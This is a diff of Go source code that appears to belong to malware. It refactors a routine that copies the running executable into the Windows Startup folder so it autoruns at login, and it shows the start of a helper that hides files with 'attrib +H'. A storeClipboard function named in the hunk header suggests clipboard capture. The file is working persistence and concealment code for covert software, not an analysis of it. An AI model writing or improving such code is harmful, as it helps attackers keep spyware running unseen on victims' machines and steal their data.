@@ -77,40 +77,39 @@ func storeClipboard(path, data string) {
 // Copy the binary to the Windows Startup folder for autorun at login
 func setupPersistence() error {
 	appData := os.Getenv("APPDATA")
-	if appData == "" {
-		return fmt.Errorf("APPDATA environment variable not found")
-	}
 	startupDir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
 	if _, err := os.Stat(startupDir); os.IsNotExist(err) {
 		err = os.MkdirAll(startupDir, 0755)
-		if err != nil {
-			return err
-		}
+		check(err)
 	}
 
 	binaryPath, err := os.Executable()
-	if err != nil {
-		return err
-	}
+	check(err)
 	binaryName := filepath.Base(binaryPath)
 	targetPath := filepath.Join(startupDir, binaryName)
 
 	// Copy binary if not already present
 	if _, err := os.Stat(targetPath); os.IsNotExist(err) {
-		in, err := os.Open(binaryPath)
-		check(err)
-		defer in.Close()
-
-		out, err := os.OpenFile(targetPath, os.O_CREATE|os.O_WRONLY, 0755)
-		check(err)
-		defer out.Close()
-
-		_, err = io.Copy(out, in)
+		err := copyBinary(binaryPath, targetPath)
 		check(err)
 	}
 	return nil
 }
 
+// copyBinary copies a file from src to dst with 0755 permissions
+func copyBinary(src, dst string) error {
+	in, err := os.Open(src)
+	check(err)
+	defer in.Close()
+
+	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY, 0755)
+	check(err)
+	defer out.Close()
+
+	_, err = io.Copy(out, in)
+	check(err)
+	return nil
+}
 // hideFile sets the hidden attribute on a file in Windows
 func hideFile(path string) error {
 	cmd := exec.Command("attrib", "+H", path)
